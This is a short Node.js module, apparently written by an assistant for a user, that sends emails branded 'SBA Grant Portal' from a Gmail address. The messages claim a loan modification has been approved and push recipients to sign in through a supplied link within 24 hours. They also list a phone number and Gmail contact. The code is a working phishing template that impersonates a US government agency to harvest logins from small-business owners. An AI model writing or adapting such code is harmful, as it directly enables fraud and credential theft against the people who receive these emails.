import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
dotenv.config();

const transporter = nodemailer.createTransport({
    // Using Gmail SMTP settings as per your provided email address
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER, // sbaforgivenessgrant1@gmail.com
        pass: process.env.EMAIL_PASS, // App password
    },
});

const sendRegistrationEmail = async (recipientEmail) => {
    // Email content based on user's request
    const mailOptions = {
        from: `SBA Grant Portal <${process.env.EMAIL_USER}>`,
        to: recipientEmail,
        subject: 'YOUR SBA GRANT MODIFICATION IS MODIFIED',
        html: `
            <div style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
                <h2 style="color: #192754;">A modification to your loan has been approved.</h2>
                <p>Please login to your SBA grant portal account to complete next step within the next 24 hours.</p>
                <br>
                <p><strong>Login Here:</strong> <a href="${process.env.CLIENT_URL}/signin" style="color: #DC3545; text-decoration: none;">SBA Grant Portal</a></p>
                <br>
                <div style="margin-top: 20px; padding-top: 10px; border-top: 1px solid #eee;">
                    <p style="font-size: 0.9em; color: #666;">Questions? We're here to help,</p>
                    <p style="font-size: 0.9em; color: #666;">Text us at: <strong>+1-618-701-2773</strong></p>
                    <p style="font-size: 0.9em; color: #666;">or send a message to: <strong>sbaforgivenessgrant1@gmail.com</strong></p>
                </div>
            </div>
        `,
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`Registration email sent successfully to ${recipientEmail}`);
    } catch (error) {
        console.error(`Error sending email to ${recipientEmail}:`, error);
        // Note: In a real app, you might queue this attempt for later retry.
    }
};

export { sendRegistrationEmail };